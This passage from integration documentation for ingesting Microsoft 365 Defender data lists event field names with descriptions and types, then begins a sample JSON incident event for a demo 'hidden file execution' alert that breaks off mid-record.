| m365_defender.event.process.integrity_level | Integrity level of the newly created process. Windows assigns integrity levels to processes based on certain characteristics, such as if they were launched from an internet downloaded. These integrity levels influence permissions to resources. | keyword |
| m365_defender.event.process.token_elevation | Token type indicating the presence or absence of User Access Control (UAC) privilege elevation applied to the newly created process. | keyword |
| m365_defender.event.process.version_info_company_name | Company name from the version information of the newly created process. | keyword |
| m365_defender.event.process.version_info_file_description | Description from the version information of the newly created process. | keyword |
| m365_defender.event.process.version_info_internal_file_name | Internal file name from the version information of the newly created process. | keyword |
| m365_defender.event.process.version_info_original_file_name | Original file name from the version information of the newly created process. | keyword |
| m365_defender.event.process.version_info_product_name | Product name from the version information of the newly created process. | keyword |
| m365_defender.event.process.version_info_product_version | Product version from the version information of the newly created process. | keyword |
| m365_defender.event.protocol | Protocol used during the communication. | keyword |
| m365_defender.event.public_ip.geo.city_name |  | keyword |
| m365_defender.event.public_ip.geo.continent_name |  | keyword |
| m365_defender.event.public_ip.geo.country_iso_code |  | keyword |
| m365_defender.event.public_ip.geo.country_name |  | keyword |
| m365_defender.event.public_ip.geo.location |  | geo_point |
| m365_defender.event.public_ip.geo.region_iso_code |  | keyword |
| m365_defender.event.public_ip.geo.region_name |  | keyword |
| m365_defender.event.public_ip.value | Public IP address used by the onboarded machine to connect to the Microsoft Defender for Endpoint service. This could be the IP address of the machine itself, a NAT device, or a proxy. | ip |
| m365_defender.event.query.target | Name of user, group, device, domain, or any other entity type being queried. | keyword |
| m365_defender.event.query.type | Type of query, such as QueryGroup, QueryUser, or EnumerateUsers. | keyword |
| m365_defender.event.query.value | String used to run the query. | keyword |
| m365_defender.event.raw_event_data | Raw event information from the source application or service in JSON format. | flattened |
| m365_defender.event.recipient.email_address | Email address of the recipient, or email address of the recipient after distribution list expansion. | keyword |
| m365_defender.event.recipient.object_id | Unique identifier for the email recipient in Azure AD. | keyword |
| m365_defender.event.registry.device_tag | Machine tag added through the registry. | keyword |
| m365_defender.event.registry.key | Registry key that the recorded action was applied to. | keyword |
| m365_defender.event.registry.value_data | Data of the registry value that the recorded action was applied to. | keyword |
| m365_defender.event.registry.value_name | Name of the registry value that the recorded action was applied to. | keyword |
| m365_defender.event.registry.value_type | Data type, such as binary or string, of the registry value that the recorded action was applied to. | keyword |
| m365_defender.event.remote.device_name | Name of the machine that performed a remote operation on the affected machine. Depending on the event being reported, this name could be a fully-qualified domain name (FQDN), a NetBIOS name, or a host name without domain information. | keyword |
| m365_defender.event.remote.ip | IP address that was being connected to. | ip |
| m365_defender.event.remote.ip_type | Type of IP address, for example Public, Private, Reserved, Loopback, Teredo, FourToSixMapping, and Broadcast. | keyword |
| m365_defender.event.remote.port | TCP port on the remote device that was being connected to. | long |
| m365_defender.event.remote.url | URL or fully qualified domain name (FQDN) that was being connected to. | keyword |
| m365_defender.event.report_id | Event identifier based on a repeating counter. To identify unique events, this column must be used in conjunction with the DeviceName and Timestamp columns. | keyword |
| m365_defender.event.request.account_domain | Domain of the account used to remotely initiate the activity. | keyword |
| m365_defender.event.request.account_name | User name of account used to remotely initiate the activity. | keyword |
| m365_defender.event.request.account_sid | Security Identifier (SID) of the account used to remotely initiate the activity. | keyword |
| m365_defender.event.request.protocol | Network protocol, if applicable, used to initiate the activity: Unknown, Local, SMB, or NFS. | keyword |
| m365_defender.event.request.source_ip | IPv4 or IPv6 address of the remote device that initiated the activity. | ip |
| m365_defender.event.request.source_port | Source port on the remote device that initiated the activity. | long |
| m365_defender.event.sender.display_name | Name of the sender displayed in the address book, typically a combination of a given or first name, a middle initial, and a last name or surname. | keyword |
| m365_defender.event.sender.from_address | Sender email address in the FROM header, which is visible to email recipients on their email clients. | keyword |
| m365_defender.event.sender.from_domain | Sender domain in the FROM header, which is visible to email recipients on their email clients. | keyword |
| m365_defender.event.sender.ipv4 | IPv4 address of the last detected mail server that relayed the message. | ip |
| m365_defender.event.sender.ipv6 | IPv6 address of the last detected mail server that relayed the message. | ip |
| m365_defender.event.sender.mail_from_address | Sender email address in the MAIL FROM header, also known as the envelope sender or the Return-Path address. | keyword |
| m365_defender.event.sender.mail_from_domain | Sender domain in the MAIL FROM header, also known as the envelope sender or the Return-Path address. | keyword |
| m365_defender.event.sender.object_id | Unique identifier for the sender's account in Azure AD. | keyword |
| m365_defender.event.sensitivity.label | Label applied to an email, file, or other content to classify it for information protection. | keyword |
| m365_defender.event.sensitivity.sub_label | Sublabel applied to an email, file, or other content to classify it for information protection; sensitivity sublabels are grouped under sensitivity labels but are treated independently. | keyword |
| m365_defender.event.sensor_health_state | Indicates health of the device's EDR sensor, if onboarded to Microsoft Defender For Endpoint. | keyword |
| m365_defender.event.service_source | Product or service that provided the alert information. | keyword |
| m365_defender.event.severity | Indicates the potential impact (high, medium, or low) of the threat indicator or breach activity identified by the alert. | keyword |
| m365_defender.event.sha1 | SHA-1 of the file that the recorded action was applied to. | keyword |
| m365_defender.event.sha256 | SHA-256 of the file that the recorded action was applied to. This field is usually not populated—use the SHA1 column when available. | keyword |
| m365_defender.event.share_name | Name of shared folder containing the file. | keyword |
| m365_defender.event.signature_type | Indicates whether signature information was read as embedded content in the file itself or read from an external catalog file. | keyword |
| m365_defender.event.signer | Information about the signer of the file. | keyword |
| m365_defender.event.signer_hash | Unique hash value identifying the signer. | keyword |
| m365_defender.event.subject | Subject of the email. | keyword |
| m365_defender.event.target.account_display_name | Display name of the account that the recorded action was applied to. | keyword |
| m365_defender.event.target.account_upn | User principal name (UPN) of the account that the recorded action was applied to. | keyword |
| m365_defender.event.target.device_name | Fully qualified domain name (FQDN) of the device that the recorded action was applied to. | keyword |
| m365_defender.event.tenant.id |  | keyword |
| m365_defender.event.tenant.name |  | keyword |
| m365_defender.event.threat.family | Malware family that the suspicious or malicious file or process has been classified under. | keyword |
| m365_defender.event.threat.names | Detection name for malware or other threats found. | keyword |
| m365_defender.event.threat.types | Verdict from the email filtering stack on whether the email contains malware, phishing, or other threats. | keyword |
| m365_defender.event.time | The time Microsoft Defender received the event. | date |
| m365_defender.event.timestamp | Date and time when the event was recorded. | date |
| m365_defender.event.title | Title of the alert. | keyword |
| m365_defender.event.tunnel_type | Tunneling protocol, if the interface is used for this purpose, for example 6to4, Teredo, ISATAP, PPTP, SSTP, and SSH. | keyword |
| m365_defender.event.url | Full URL in the email subject, body, or attachment. | keyword |
| m365_defender.event.url_chain | For scenarios involving redirections, it includes URLs present in the redirection chain. | keyword |
| m365_defender.event.url_count | Number of embedded URLs in the email. | long |
| m365_defender.event.url_domain | Domain name or host name of the URL. | keyword |
| m365_defender.event.url_location |  | keyword |
| m365_defender.event.user_agent | User agent information from the web browser or other client application. | keyword |
| m365_defender.event.user_agent_tags | More information provided by Microsoft Defender for Cloud Apps in a tag in the user agent field. Can have any of the following values: Native client, Outdated browser, Outdated operating system, Robot. | keyword |
| m365_defender.event.user_level_action | Action taken on the email in response to matches to a mailbox policy defined by the recipient. | keyword |
| m365_defender.event.user_level_policy | End-user mailbox policy that triggered the action taken on the email. | keyword |
| m365_defender.event.vendor | Name of the product vendor or manufacturer, only available if device discovery finds enough information about this attribute. | keyword |
| m365_defender.event.workload | The application from which the user clicked on the link, with the values being Email, Office and Teams. | keyword |
| message | For log events the message field contains the log message, optimized for viewing in a log viewer. For structured logs without an original message field, other fields can be concatenated to form a human-readable summary of the event. If multiple messages exist, they can be combined into one message. | match_only_text |
| network.direction | Direction of the network traffic. When mapping events from a host-based monitoring context, populate this field from the host's point of view, using the values "ingress" or "egress". When mapping events from a network or perimeter-based monitoring context, populate this field from the point of view of the network perimeter, using the values "inbound", "outbound", "internal" or "external". Note that "internal" is not crossing perimeter boundaries, and is meant to describe communication between two hosts within the perimeter. Note also that "external" is meant to describe traffic between two hosts that are external to the perimeter. This could for example be useful for ISPs or VPN service providers. | keyword |
| network.protocol | In the OSI Model this would be the Application Layer protocol. For example, `http`, `dns`, or `ssh`. The field value must be normalized to lowercase for querying. | keyword |
| observer.type | The type of the observer the data is coming from. There is no predefined list of observer types. Some examples are `forwarder`, `firewall`, `ids`, `ips`, `proxy`, `poller`, `sensor`, `APM server`. | keyword |
| observer.version | Observer version. | keyword |
| process.Ext.api.name |  | keyword |
| process.Ext.api.parameters.address | The target memory address. | long |
| process.Ext.api.parameters.desired_access_numeric | This parameter indicates the numeric value of the `DesiredAccess` field passed to `OpenProcess` or `OpenThread`. | long |
| process.Ext.api.parameters.protection | The memory protection for the region of pages. Corresponds to `MEMORY_BASIC_INFORMATION.Protect`. | keyword |
| process.Ext.api.parameters.size | The size of parameter values passed to the API call. | long |
| process.Ext.token.integrity_level_name | Integrity level that determine the levels of protection or access for a principal used by Mandatory Integrity Control (MIC). | keyword |
| process.args | Array of process arguments, starting with the absolute path to the executable. May be filtered to protect sensitive information. | keyword |
| process.args_count | Length of the process.args array. This field can be useful for querying or performing bucket analysis on how many arguments were provided to start a process. More arguments may be an indication of suspicious activity. | long |
| process.code_signature.status | Additional information about the certificate status. This is useful for logging cryptographic errors with the certificate validity or trust status. Leave unpopulated if the validity or trust of the certificate was unchecked. | keyword |
| process.command_line | Full command line that started the process, including the absolute path to the executable, and all arguments. Some arguments may be filtered to protect sensitive information. | wildcard |
| process.command_line.text | Multi-field of `process.command_line`. | match_only_text |
| process.executable | Absolute path to the process executable. | keyword |
| process.executable.text | Multi-field of `process.executable`. | match_only_text |
| process.hash.md5 | MD5 hash. | keyword |
| process.hash.sha1 | SHA1 hash. | keyword |
| process.hash.sha256 | SHA256 hash. | keyword |
| process.name | Process name. Sometimes called program name or similar. | keyword |
| process.name.text | Multi-field of `process.name`. | match_only_text |
| process.parent.args | Array of process arguments, starting with the absolute path to the executable. May be filtered to protect sensitive information. | keyword |
| process.parent.args_count | Length of the process.args array. This field can be useful for querying or performing bucket analysis on how many arguments were provided to start a process. More arguments may be an indication of suspicious activity. | long |
| process.parent.code_signature.exists | Boolean to capture if a signature is present. | boolean |
| process.parent.code_signature.status | Additional information about the certificate status. This is useful for logging cryptographic errors with the certificate validity or trust status. Leave unpopulated if the validity or trust of the certificate was unchecked. | keyword |
| process.parent.code_signature.trusted | Stores the trust status of the certificate chain. Validating the trust of the certificate chain may be complicated, and this field should only be populated by tools that actively check the status. | boolean |
| process.parent.command_line | Full command line that started the process, including the absolute path to the executable, and all arguments. Some arguments may be filtered to protect sensitive information. | wildcard |
| process.parent.command_line.text | Multi-field of `process.parent.command_line`. | match_only_text |
| process.parent.executable | Absolute path to the process executable. | keyword |
| process.parent.executable.text | Multi-field of `process.parent.executable`. | match_only_text |
| process.parent.group_leader.name |  | keyword |
| process.parent.group_leader.pid | Process id. | long |
| process.parent.group_leader.start | The time the process started. | date |
| process.parent.hash.md5 | MD5 hash. | keyword |
| process.parent.hash.sha1 | SHA1 hash. | keyword |
| process.parent.hash.sha256 | SHA256 hash. | keyword |
| process.parent.name | Process name. Sometimes called program name or similar. | keyword |
| process.parent.name.text | Multi-field of `process.parent.name`. | match_only_text |
| process.parent.pe.company | Internal company name of the file, provided at compile-time. | keyword |
| process.parent.pe.description | Internal description of the file, provided at compile-time. | keyword |
| process.parent.pe.file_version | Internal version of the file, provided at compile-time. | keyword |
| process.parent.pe.original_file_name | Internal name of the file, provided at compile-time. | keyword |
| process.parent.pe.product | Internal product name of the file, provided at compile-time. | keyword |
| process.parent.pid | Process id. | long |
| process.parent.start | The time the process started. | date |
| process.pe.company | Internal company name of the file, provided at compile-time. | keyword |
| process.pe.description | Internal description of the file, provided at compile-time. | keyword |
| process.pe.file_version | Internal version of the file, provided at compile-time. | keyword |
| process.pe.original_file_name | Internal name of the file, provided at compile-time. | keyword |
| process.pe.product | Internal product name of the file, provided at compile-time. | keyword |
| process.pid | Process id. | long |
| process.start | The time the process started. | date |
| registry.data.strings | Content when writing string types. Populated as an array when writing string data to the registry. For single string registry types (REG_SZ, REG_EXPAND_SZ), this should be an array with one string. For sequences of string with REG_MULTI_SZ, this array will be variable length. For numeric data, such as REG_DWORD and REG_QWORD, this should be populated with the decimal representation (e.g `"1"`). | wildcard |
| registry.data.type | Standard registry type for encoding contents | keyword |
| registry.hive | Abbreviated name for the hive. | keyword |
| registry.key | Hive-relative path of keys. | keyword |
| registry.path | Full path, including hive, key and value | keyword |
| registry.value | Name of the value written. | keyword |
| related.hash | All the hashes seen on your event. Populating this field, then using it to search for hashes can help in situations where you're unsure what the hash algorithm is (and therefore which key name to search). | keyword |
| related.hosts | All hostnames or other host identifiers seen on your event. Example identifiers include FQDNs, domain names, workstation names, or aliases. | keyword |
| related.ip | All of the IPs seen on your event. | ip |
| related.user | All the user names or other user identifiers seen on the event. | keyword |
| source.domain | The domain name of the source system. This value may be a host name, a fully qualified domain name, or another host naming format. The value may derive from the original event or be added from enrichment. | keyword |
| source.geo.city_name | City name. | keyword |
| source.geo.continent_name | Name of the continent. | keyword |
| source.geo.country_iso_code | Country ISO code. | keyword |
| source.geo.country_name | Country name. | keyword |
| source.geo.location | Longitude and latitude. | geo_point |
| source.geo.region_iso_code | Region ISO code. | keyword |
| source.geo.region_name | Region name. | keyword |
| source.ip | IP address of the source (IPv4 or IPv6). | ip |
| source.port | Port of the source. | long |
| source.user.domain | Name of the directory the user is a member of. For example, an LDAP or Active Directory domain name. | keyword |
| source.user.id | Unique identifier of the user. | keyword |
| source.user.name | Short name or login of the user. | keyword |
| source.user.name.text | Multi-field of `source.user.name`. | match_only_text |
| tags | List of keywords used to tag each event. | keyword |
| threat.group.name | The name of the group for a set of related intrusion activity that are tracked by a common name in the security community. While not required, you can use a MITRE ATT&CK® group name. | keyword |
| threat.indicator.file.directory | Directory where the file is located. It should include the drive letter, when appropriate. | keyword |
| threat.indicator.file.hash.sha1 | SHA1 hash. | keyword |
| threat.indicator.file.hash.sha256 | SHA256 hash. | keyword |
| threat.indicator.file.name | Name of the file including the extension, without the directory. | keyword |
| threat.indicator.file.size | File size in bytes. Only relevant when `file.type` is "file". | long |
| threat.indicator.registry.data.strings | Content when writing string types. Populated as an array when writing string data to the registry. For single string registry types (REG_SZ, REG_EXPAND_SZ), this should be an array with one string. For sequences of string with REG_MULTI_SZ, this array will be variable length. For numeric data, such as REG_DWORD and REG_QWORD, this should be populated with the decimal representation (e.g `"1"`). | wildcard |
| threat.indicator.registry.key | Hive-relative path of keys. | keyword |
| threat.indicator.registry.value | Name of the value written. | keyword |
| threat.indicator.type | Type of indicator as represented by Cyber Observable in STIX 2.0. | keyword |
| threat.technique.subtechnique.id | The full id of subtechnique used by this threat. You can use a MITRE ATT&CK® subtechnique, for example. (ex. https://attack.mitre.org/techniques/T1059/001/) | keyword |
| threat.technique.subtechnique.name | The name of subtechnique used by this threat. You can use a MITRE ATT&CK® subtechnique, for example. (ex. https://attack.mitre.org/techniques/T1059/001/) | keyword |
| threat.technique.subtechnique.name.text | Multi-field of `threat.technique.subtechnique.name`. | match_only_text |
| url.domain | Domain of the url, such as "www.elastic.co". In some cases a URL may refer to an IP and/or port directly, without a domain name. In this case, the IP address would go to the `domain` field. If the URL contains a literal IPv6 address enclosed by `[` and `]` (IETF RFC 2732), the `[` and `]` characters should also be captured in the `domain` field. | keyword |
| url.extension | The field contains the file extension from the original request url, excluding the leading dot. The file extension is only set if it exists, as not every url has a file extension. The leading period must not be included. For example, the value must be "png", not ".png". Note that when the file name has multiple extensions (example.tar.gz), only the last one should be captured ("gz", not "tar.gz"). | keyword |
| url.fragment | Portion of the url after the `#`, such as "top". The `#` is not part of the fragment. | keyword |
| url.original | Unmodified original url as seen in the event source. Note that in network monitoring, the observed URL may be a full URL, whereas in access logs, the URL is often just represented as a path. This field is meant to represent the URL as it was observed, complete or not. | wildcard |
| url.original.text | Multi-field of `url.original`. | match_only_text |
| url.password | Password of the request. | keyword |
| url.path | Path of the request, such as "/search". | wildcard |
| url.port | Port of the request, such as 443. | long |
| url.query | The query field describes the query string of the request, such as "q=elasticsearch". The `?` is excluded from the query string. If a URL contains no `?`, there is no query field. If there is a `?` but no query, the query field exists with an empty string. The `exists` query can be used to differentiate between the two cases. | keyword |
| url.scheme | Scheme of the request, such as "https". Note: The `:` is not part of the scheme. | keyword |
| url.user_info |  | keyword |
| url.username | Username of the request. | keyword |
| user.domain | Name of the directory the user is a member of. For example, an LDAP or Active Directory domain name. | keyword |
| user.id | Unique identifier of the user. | keyword |
| user.name | Short name or login of the user. | keyword |
| user.name.text | Multi-field of `user.name`. | match_only_text |
| user_agent.device.name | Name of the device. | keyword |
| user_agent.name | Name of the user agent. | keyword |
| user_agent.original | Unparsed user_agent string. | keyword |
| user_agent.original.text | Multi-field of `user_agent.original`. | match_only_text |
| user_agent.os.full | Operating system name, including the version or code name. | keyword |
| user_agent.os.full.text | Multi-field of `user_agent.os.full`. | match_only_text |
| user_agent.os.name | Operating system name, without the version. | keyword |
| user_agent.os.name.text | Multi-field of `user_agent.os.name`. | match_only_text |
| user_agent.os.version | Operating system version as a raw string. | keyword |
| user_agent.version | Version of the user agent. | keyword |


### incident

This is the `incident` dataset.

#### Example

An example event for `incident` looks as following:

```json
{
    "@timestamp": "2021-09-30T09:35:45.113Z",
    "agent": {
        "ephemeral_id": "b25e1419-d728-4361-8b2c-b147f421b7c9",
        "id": "5aad2f43-374a-4a11-a080-b8039c1ee9a1",
        "name": "docker-fleet-agent",
        "type": "filebeat",
        "version": "8.13.0"
    },
    "cloud": {
        "account": {
            "id": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c"
        },
        "provider": [
            "azure"
        ]
    },
    "data_stream": {
        "dataset": "m365_defender.incident",
        "namespace": "ep",
        "type": "logs"
    },
    "ecs": {
        "version": "8.11.0"
    },
    "elastic_agent": {
        "id": "5aad2f43-374a-4a11-a080-b8039c1ee9a1",
        "snapshot": true,
        "version": "8.13.0"
    },
    "event": {
        "action": [
            "detected"
        ],
        "agent_id_status": "verified",
        "created": "2021-08-13T08:43:35.553Z",
        "dataset": "m365_defender.incident",
        "id": "2972395",
        "ingested": "2024-01-17T16:05:30Z",
        "kind": "alert",
        "original": "{\"@odata.type\":\"#microsoft.graph.security.incident\",\"alerts\":{\"@odata.type\":\"#microsoft.graph.security.alert\",\"actorDisplayName\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/da637551227677560813_-961444813?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"assignedTo\":null,\"category\":\"DefenseEvasion\",\"classification\":\"unknown\",\"comments\":[],\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"description\":\"A hidden file has been launched. This activity could indicate a compromised host. Attackers often hide files associated with malicious tools to evade file system inspection and defenses.\",\"detectionSource\":\"antivirus\",\"detectorId\":\"e0da400f-affd-43ef-b1d5-afc2eb6f2756\",\"determination\":\"unknown\",\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":null,\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"defenderAvStatus\":\"unknown\",\"deviceDnsName\":\"tempDns\",\"firstSeenDateTime\":\"2020-09-12T07:28:32.4321753Z\",\"healthStatus\":\"active\",\"loggedOnUsers\":[],\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22424,\"osPlatform\":\"Windows10\",\"rbacGroupId\":75,\"rbacGroupName\":\"UnassignedGroup\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"medium\",\"roles\":[\"compromised\"],\"tags\":[\"Test Machine\"],\"verdict\":\"unknown\",\"version\":\"Other\",\"vmMetadata\":{\"cloudProvider\":\"azure\",\"resourceId\":\"/subscriptions/8700d3a3-3bb7-4fbe-a090-488a1ad04161/resourceGroups/WdatpApi-EUS-STG/providers/Microsoft.Compute/virtualMachines/NirLaviTests\",\"subscriptionId\":\"8700d3a3-3bb7-4fbe-a090-488a1ad04161\",\"vmId\":\"ca1b0d41-5a3b-4d95-b48b-f220aed11d78\"}},{\"@odata.type\":\"#microsoft.graph.security.fileEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"detectionStatus\":\"detected\",\"fileDetails\":{\"fileName\":\"MsSense.exe\",\"filePath\":\"C:\\\\Program Files\\\\temp\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":6136392,\"issuer\":null,\"sha1\":\"5f1e8acedc065031aad553b710838eb366cfee9a\",\"sha256\":\"8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec\",\"signer\":null},\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"detectionStatus\":\"detected\",\"imageFile\":{\"fileName\":\"MsSense.exe\",\"filePath\":\"C:\\\\Program Files\\\\temp\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":6136392,\"issuer\":null,\"sha1\":\"5f1e8acedc065031aad553b710838eb366cfee9a\",\"sha256\":\"8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec\",\"signer\":null},\"mdeDeviceId\":\"73e7e2de709dff64ef64b1d0c30e67fab63279db\",\"parentProcessCreationDateTime\":\"2021-08-12T07:39:09.0909239Z\",\"parentProcessId\":668,\"parentProcessImageFile\":{\"fileName\":\"services.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":731744,\"issuer\":null,\"sha1\":null,\"sha256\":null,\"signer\":null},\"processCommandLine\":\"\\\"MsSense.exe\\\"\",\"processCreationDateTime\":\"2021-08-12T12:43:19.0772577Z\",\"processId\":4780,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"SYSTEM\",\"azureAdUserId\":null,\"domainName\":\"NT AUTHORITY\",\"userPrincipalName\":null,\"userSid\":\"S-1-5-18\"},\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.registryKeyEvidence\",\"createdDateTime\":\"2021-04-27T12:19:27.7211305Z\",\"registryHive\":\"HKEY_LOCAL_MACHINE\",\"registryKey\":\"SYSTEM\\\\CONTROLSET001\\\\CONTROL\\\\WMI\\\\AUTOLOGGER\\\\SENSEAUDITLOGGER\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"unknown\"}],\"firstActivityDateTime\":\"2021-04-26T07:45:50.116Z\",\"id\":\"da637551227677560813_-961444813\",\"incidentId\":\"28282\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/28282?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"lastActivityDateTime\":\"2021-05-02T07:56:58.222Z\",\"lastUpdateDateTime\":\"2021-05-02T14:19:01.3266667Z\",\"mitreTechniques\":[\"T1564.001\"],\"providerAlertId\":\"da637551227677560813_-961444813\",\"recommendedActions\":\"Collect artifacts and determine scope\\n�\\tReview the machine timeline for suspicious activities that may have occurred before and after the time of the alert, and record additional related artifacts (files, IPs/URLs) \\n�\\tLook for the presence of relevant artifacts on other systems. Identify commonalities and differences between potentially compromised systems.\\n�\\tSubmit relevant files for deep analysis and review resulting detailed behavioral information.\\n�\\tSubmit undetected files to the MMPC malware portal\\n\\nInitiate containment \\u0026 mitigation \\n�\\tContact the user to verify intent and initiate local remediation actions as needed.\\n�\\tUpdate AV signatures and run a full scan. The scan might reveal and remove previously-undetected malware components.\\n�\\tEnsure that the machine has the latest security updates. In particular, ensure that you have installed the latest software, web browser, and Operating System versions.\\n�\\tIf credential theft is suspected, reset all relevant users passwords.\\n�\\tBlock communication with relevant URLs or IPs at the organization�s perimeter.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"low\",\"status\":\"new\",\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious execution of hidden file\"},\"assignedTo\":\"KaiC@contoso.onmicrosoft.com\",\"classification\":\"truePositive\",\"comments\":[{\"comment\":\"Demo incident\",\"createdBy\":\"DavidS@contoso.onmicrosoft.com\",\"createdTime\":\"2021-09-30T12:07:37.2756993Z\"}],\"createdDateTime\":\"2021-08-13T08:43:35.5533333Z\",\"determination\":\"multiStagedAttack\",\"displayName\":\"Multi-stage incident involving Initial access \\u0026 Command and control on multiple endpoints reported by multiple sources\",\"id\":\"2972395\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47\",\"lastUpdateDateTime\":\"2021-09-30T09:35:45.1133333Z\",\"redirectIncidentId\":null,\"severity\":\"medium\",\"status\":\"active\",\"tags\":[\"Demo\"],\"tenantId\":\"b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c\"}",
        "provider": "microsoftDefenderForEndpoint",
        "severity": 3,
        "url": "https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47"
    },
    "file": {
        "hash": {
            "sha1": [
                "5f1e8acedc065031aad553b710838eb366cfee9a"
            ],
            "sha256": [
                "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
            ]
        },
        "name": [
            "MsSense.exe"
        ],
        "path": [
            "C:\\Program Files\\temp"
        ],
        "size": [
            6136392
        ]
    },
    "host": {
        "id": [
            "73e7e2de709dff64ef64b1d0c30e67fab63279db"
        ],
        "name": [
            "tempdns"
        ],
        "os": {
            "name": [
                "Windows10"
            ],
            "version": [
                "Other"
            ]
        }
    },
    "input": {
        "type": "httpjson"
    },
    "m365_defender": {
        "incident": {
            "alert": {
                "alert_web_url": {
                    "domain": "security.microsoft.com",
                    "original": "https://security.microsoft.com/alerts/da637551227677560813_-961444813?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
                    "path": "/alerts/da637551227677560813_-961444813",
                    "query": "tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
                    "scheme": "https"
                },
                "category": "DefenseEvasion",
                "classification": "unknown",
                "created_datetime": "2021-04-27T12:19:27.721Z",
                "description": "A hidden file has been launched. This activity could indicate a compromised host. Attackers often hide files associated with malicious tools to evade file system inspection and defenses.",
                "detection_source": "antivirus",
                "detector_id": "e0da400f-affd-43ef-b1d5-afc2eb6f2756",
                "determination": "unknown",
                "evidence": [
                    {
                        "created_datetime": "2021-04-27T12:19:27.721Z",
                        "defender_av_status": "unknown",
                        "device_dns_name": "tempDns",
                        "first_seen_datetime": "2020-09-12T07:28:32.432Z",
                        "health_status": "active",
                        "mde_device_id": "73e7e2de709dff64ef64b1d0c30e67fab63279db",
                        "odata_type": "#microsoft.graph.security.deviceEvidence",
                        "onboarding_status": "onboarded",
                        "os_build": "22424",
                        "os_platform": "Windows10",
                        "rbac_group": {
                            "id": "75",
                            "name": "UnassignedGroup"
                        },
                        "remediation_status": "none",
                        "risk_score": "medium",
                        "roles": [
                            "compromised"
                        ],
                        "tags": [
                            "Test Machine"
                        ],
                        "verdict": "unknown",
                        "version": "Other",
                        "vm_metadata": {
                            "cloud_provider": "azure",
                            "resource_id": "/subscriptions/8700d3a3-3bb7-4fbe-a090-488a1ad04161/resourceGroups/WdatpApi-EUS-STG/providers/Microsoft.Compute/virtualMachines/NirLaviTests",
                            "subscription_id": "8700d3a3-3bb7-4fbe-a090-488a1ad04161",
                            "vm_id": "ca1b0d41-5a3b-4d95-b48b-f220aed11d78"
                        }
                    },
                    {
                        "created_datetime": "2021-04-27T12:19:27.721Z",
                        "detection_status": "detected",
                        "file_details": {
                            "name": "MsSense.exe",
                            "path": "C:\\Program Files\\temp",
                            "publisher": "Microsoft Corporation",
                            "sha1": "5f1e8acedc065031aad553b710838eb366cfee9a",
                            "sha256": "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec",
                            "size": 6136392
                        },
                        "mde_device_id": "73e7e2de709dff64ef64b1d0c30e67fab63279db",
                        "odata_type": "#microsoft.graph.security.fileEvidence",
                        "remediation_status": "none",
                        "verdict": "unknown"
                    },
                    {
                        "created_datetime": "2021-04-27T12:19:27.721Z",
                        "detection_status": "detected",
                        "image_file": {
                            "name": "MsSense.exe",
                            "path": "C:\\Program Files\\temp",
                            "publisher": "Microsoft Corporation",
                            "sha1": "5f1e8acedc065031aad553b710838eb366cfee9a",
                            "sha256": "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec",
                            "size": 6136392
                        },
                        "mde_device_id": "73e7e2de709dff64ef64b1d0c30e67fab63279db",
                        "odata_type": "#microsoft.graph.security.processEvidence",
                        "parent_process": {
                            "creation_datetime": "2021-08-12T07:39:09.090Z",
                            "id": 668,
                            "image_file": {
                                "name": "services.exe",
                                "path": "C:\\Windows\\System32",
                                "publisher": "Microsoft Corporation",
                                "size": 731744
                            }
                        },
                        "process": {
                            "command_line": "\"MsSense.exe\"",
                            "creation_datetime": "2021-08-12T12:43:19.077Z",
                            "id": 4780
                        },
                        "remediation_status": "none",
                        "user_account": {
                            "account_name": "SYSTEM",
                            "domain_name": "NT AUTHORITY",
                            "user_sid": "S-1-5-18"
                        },
                        "verdict": "unknown"
                    },
                    {
                        "created_datetime": "2021-04-27T12:19:27.721Z",
                        "odata_type": "#microsoft.graph.security.registryKeyEvidence",
                        "registry_hive": "HKEY_LOCAL_MACHINE",
                        "registry_key": "SYSTEM\\CONTROLSET001\\CONTROL\\WMI\\AUTOLOGGER\\SENSEAUDITLOGGER",
                        "remediation_status": "none",
